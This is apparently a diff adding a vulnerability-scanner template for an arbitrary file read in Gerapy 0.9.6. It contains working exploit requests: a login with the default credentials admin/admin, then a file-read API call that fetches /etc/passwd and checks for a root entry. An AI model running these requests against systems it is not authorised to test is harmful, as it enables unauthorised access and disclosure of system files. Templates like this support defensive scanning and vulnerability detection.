@@ -1,0 +1,54 @@
+id: gerapy-file-read
+
+info:
+  name: Gerapy 0.9.6 Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Gerapy 0.9.6 contains an arbitrary file read vulnerability. An attacker can authenticate using default credentials and access sensitive files, such as /etc/passwd.
+  reference:
+    - https://github.com/Gerapy/Gerapy/issues/210
+
+variables:
+  filepath: "/etc/"
+  filename: "passwd"
+
+http:
+  - id: authenticate
+    method: POST
+    path:
+      - "/api/user/auth"
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    body: |
+      {"username":"admin","password":"admin"}
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'token')"
+    extractors:
+      - type: regex
+        name: token
+        internal: true
+        regex:
+          - "\"token\":\"(.*?)\""
+
+  - id: file-read
+    method: POST
+    path:
+      - "/api/project/file/read"
+    headers:
+      Content-Type: application/json;charset=UTF-8
+      Authorization: "Token {{token}}"
+    body: |
+      {"path":"{{filepath}}", "label":"{{filename}}"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:(x*?):0:0:"
